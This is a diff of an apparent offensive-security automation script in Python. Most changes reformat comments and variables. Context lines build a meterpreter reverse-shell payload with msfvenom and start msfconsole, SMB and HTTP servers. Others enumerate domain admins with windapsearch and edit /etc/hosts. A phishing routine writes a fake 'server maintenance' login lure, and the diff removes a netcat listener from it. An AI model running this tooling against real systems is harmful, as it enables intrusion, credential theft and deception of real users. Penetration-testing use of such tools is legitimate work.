@@ -55,9 +55,9 @@ else:
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
 
-maxUser = 5000							# UNLIMITED VALUE
+maxUser = 5000                                                 # UNLIMITED VALUE
 
-colour0 = "red"							# DISPLAY COLOURS
+colour0 = "red"                                                # DISPLAY COLOURS
 colour1 = "grey"
 colour2 = "cyan"
 colour3 = "blue"
@@ -67,14 +67,14 @@ colour6 = "green"
 colour7 = "yellow"
 colour8 = "magenta"
 
-netWork = "tun0"						# LOCAL INTERFACE
+netWork = "tun0"                                               # LOCAL INTERFACE
 
-dataDir = "ROGUEAGENT"						# LOCAL DIRECTORY
+dataDir = "ROGUEAGENT"                                         # LOCAL DIRECTORY
 workDir = "BLACKBRIAR"
 httpDir = "TREADSTONE"
 
-fileExt = "xlsx,docx,doc,txt,xml,bak,zip,php,html,pdf"		# FILE EXTENSIONS
-keyPath = "python3 /usr/share/doc/python3-impacket/examples/"	# PATH 2 IMPACKET
+fileExt = "xlsx,docx,doc,txt,xml,bak,zip,php,html,pdf"         # FILE EXTENSIONS
+keyPath = "python3 /usr/share/doc/python3-impacket/examples/"  # PATH 2 IMPACKET
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -628,18 +628,20 @@ if not os.path.exists(dataDir + "/tokens.txt"):
 else:
    print("[+] File tokens.txt already exists...")
    
-SKEW = 0         							# TIME SKEW
-DOMC = 0								# DOMAIN COUNTER
-DNSC = 0								# DNS COUNTER
-COL1 = 40	 							# SESSIONS
-COL2 = 44	 							# SHARE NAMES
-COL3 = 23	 							# USER NAMES
-COL4 = 32	 							# HASHED PASSWORDS
-COL5 = 1								# TOKENS
+SKEW = 0                                  # TIME-SKEW SWITCH
+DOMC = 0                                  # DOMAIN SWITCH
+DNSC = 0                                  # DNS SWITCH
+
+COL1 = 40                                 # MAX LEN SESSION DATA
+COL2 = 44                                 # MAX LEN SHARE NAME
+COL3 = 23                                 # MAX LEN USER NAME
+COL4 = 32                                 # MAX LEN NTLM HASH
+COL5 = 1                                  # MAX LEN TOKEN VALUE
+
 SHAR = [" "*COL2]*maxUser						# SHARE NAMES
 USER = [" "*COL3]*maxUser						# USER NAMES
-HASH = [" "*COL4]*maxUser						# PASSWORDS
-VALD = ["0"*COL5]*maxUser						# USER TOKEN
+HASH = [" "*COL4]*maxUser						# NTLM HASH
+VALD = ["0"*COL5]*maxUser						# USER TOKENS
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -651,18 +653,18 @@ VALD = ["0"*COL5]*maxUser						# USER TOKEN
 
 if not os.path.exists(dataDir + "/config.txt"):
    print("[-] Configuration file not found - using defualt values...")
-   DNS = "EMPTY              "						# DNS NAME
-   TIP = "EMPTY              " 						# REMOTE IP
-   POR = "EMPTY              " 						# LIVE PORTS
-   WEB = "EMPTY              " 						# WEB ADDRESS
-   USR = "''                 " 						# SESSION USERNAME
-   PAS = "''                 "						# SESSION PASSWORD       
-   NTM = "EMPTY              " 						# NTLM HASH
-   TGT = "EMPTY              "						# TICKET NAME
-   DOM = "EMPTY              " 						# DOMAIN NAME
-   SID = "EMPTY              " 						# DOMAIN SID
-   TSH = "EMPTY              " 						# SESSION SHARE
-   LTM = "00:00              " 						# LOCAL TIME    
+   DNS = "EMPTY              "						                        # DNS IP
+   TIP = "EMPTY              " 						                        # REMOTE IP
+   POR = "EMPTY              " 						                        # LIVE PORTS
+   WEB = "EMPTY              " 						                        # WEB ADDRESS
+   USR = "''                 " 						                        # SESSION USERNAME
+   PAS = "''                 "						                        # SESSION PASSWORD       
+   NTM = "EMPTY              " 						                        # SESSION HASH
+   TGT = "EMPTY              "						                        # SESSION TICKET-NAME
+   DOM = "EMPTY              " 						                        # SESSION DOMAIN-NAME
+   SID = "EMPTY              " 						                        # SESSION DOMAIN-SID
+   TSH = "EMPTY              " 						                        # SESSIOM SHARE
+   LTM = "00:00              " 						                        # LOCAL TIME            # check if this is still required       
 else:
    print("[+] Configuration file found - restoring saved data....")
    DNS = linecache.getline(dataDir + "/config.txt", 1).rstrip("\n")
@@ -676,12 +678,12 @@ else:
    DOM = linecache.getline(dataDir + "/config.txt", 9).rstrip("\n")	
    SID = linecache.getline(dataDir + "/config.txt", 10).rstrip("\n")
    TSH = linecache.getline(dataDir + "/config.txt", 11).rstrip("\n")
-   LTM = linecache.getline(dataDir + "/config.txt", 12).rstrip("\n")
+   LTM = linecache.getline(dataDir + "/config.txt", 12).rstrip("\n")    # LOCAL TIME            # check if this is still required
 
-PTS = POR
 DNS = spacePadding(DNS, COL1)
 TIP = spacePadding(TIP, COL1)
-POR = spacePadding(POR, COL1)
+PTS = POR                                                               # KEEP FULL SCANNED IP LIST IN MEMORY
+POR = spacePadding(POR, COL1)                                           # PARTIAL IP LIST
 WEB = spacePadding(WEB, COL1)
 USR = spacePadding(USR, COL1)
 PAS = spacePadding(PAS, COL1)
@@ -731,7 +733,7 @@ command("xdotool type 'python3 -m http.server 8080'; xdotool key Return")
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
 # Version : TREADSTONE                                                             
-# Details : Start SMB server.
+# Details : Start SMB server
 # Modified: N/A                                                               	
 # -------------------------------------------------------------------------------------
 
@@ -745,7 +747,7 @@ command("xdotool type 'impacket-smbserver C:\\tmp " + httpDir + "/ -smb2support'
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
 # Version : TREADSTONE                                                             
-# Details : Start metersploit server
+# Details : Start metersploit server.
 # Modified: N/A                                                               	
 # -------------------------------------------------------------------------------------
 
@@ -766,7 +768,7 @@ command("xdotool type 'msfconsole -r meterpreter.rc'; xdotool key Return")
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
 # Version : TREADSTONE                                                             
-# Details : Start phishing server
+# Details : Start phishing server.
 # Modified: N/A                                                               	
 # -------------------------------------------------------------------------------------
 
@@ -781,7 +783,7 @@ command("xdotool key Ctrl+Shift+Tab")
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
 # Version : TREADSTONE                                                             
-# Details : Set up local exploit files.
+# Details : Create locally defined exploit files.
 # Modified: N/A                                                               	
 # -------------------------------------------------------------------------------------
 
@@ -795,27 +797,27 @@ command("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=" + localIP + " LPO
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
 # Version : TREADSTONE                                                             
-# Details : Start the main menu controller
+# Details : Start the main menu controller.
 # Modified: N/A                                                               	
 # -------------------------------------------------------------------------------------
 
 while True: 
-   saveParams()								# PARAM'S SAVED
-   command("rm *.tmp")							# CLEAR GARBAGE
-   linecache.clearcache()						# CLEARS CACHES
-   checkParams = 0							# RESET'S VALUE
-   checkFile = ""							# RESET'S VALUE
-   LTM = getTime(COL1)							# GET CLOCKTIME
-   command("clear")							# CLEARS SCREEN
-   display()								# DISPLAY UPPER
-   options()								# DISPLAY LOWER
+   saveParams()                                             # PARAM'S SAVED
+   command("rm *.tmp")                                      # CLEAR GARBAGE
+   linecache.clearcache()                                   # CLEARS CACHES
+   checkParams = 0                                          # RESET'S VALUE
+   checkFile = ""	                                          # RESET'S VALUE
+   LTM = getTime(COL1)                                      # GET CLOCKTIME
+   command("clear")                                         # CLEARS SCREEN
+   display()                                                # DISPLAY UPPER
+   options()                                                # DISPLAY LOWER
    selection=input("[*] Please select an option: ")			# SELECT CHOICE
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - Autofill PORTS, DOMAIN, SID, SHARES, USERS etc.
+# Details : Menu option selected - Secret option that autofill's PORTS, DOMAIN, SID, SHARES, USERS etc.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1147,7 +1149,9 @@ while True:
    if selection == '9':
       BAK = DOM
       DOM = input("[*] Please enter DOMAIN name: ")
-      if DOM != "":
+      if DOM == "":
+         DOM = BAK
+      else:
          DOM = spacePadding(DOM, COL1)
          if DOMC == 1:
             print("[+] Removing previous domain name from /etc/hosts...")
@@ -1156,11 +1160,8 @@ while True:
          if DOM[:5] != "EMPTY":
             command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
             print("[+] DOMAIN " + DOM.rstrip(" ") + " has been added to /etc/hosts...")
-            DOMC = 1  
-            prompt()
-      else:
-         DOM = BAK
-
+            DOMC = 1
+         prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1546,6 +1547,9 @@ while True:
       if checkParams != 1:      
          print("[*] Enumerating DNS zones...")
          command(keyPath + "windapsearch.py --dc-ip " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -l " + DOM.rstrip(" ") + " --full")      
+         
+         # NEED TO INSERT A CHECK HERE TO SAVE RUNNING COMMAND BELOW AS WELL IF THERE IS AN SERVICE ERROR
+         
          print("\n[*] Enumerating domain admins...")
          command(keyPath + "windapsearch.py --dc-ip " + TIP.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --da --full")                  
          print("\n[*] Enumerating admin protected objects...")
@@ -2689,7 +2693,7 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - Mr Phiser is experimental!!
+# Details : Menu option selected - Automated phisher.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -2701,14 +2705,6 @@ while True:
          checkParams = 1         
          
       if checkParams != 1:
-         command("xdotool key Ctrl+Shift+T")
-         command("xdotool key Alt+Shift+S; xdotool type 'GONE PHISHING'; xdotool key Return")
-         command("xdotool type 'clear; cat ; + dataDir + '/banner4.txt'; xdotool key Return")
-         command("xdotool type 'nc -nvlp 80'; xdotool key Return")
-         command("xdotool key Ctrl+Shift+Tab")
-         command("xdotool key Ctrl+Shift+Tab") # extra screens open
-         command("xdotool key Ctrl+Shift+Tab")
-         command("xdotool key Ctrl+Shift+Tab")                 
          command('echo "Hello.\n" > body.tmp')
          command('echo "We just performed maintenance on our servers." >> body.tmp')
          command('echo "Please verify if you can still access the login page:\n" >> body.tmp')
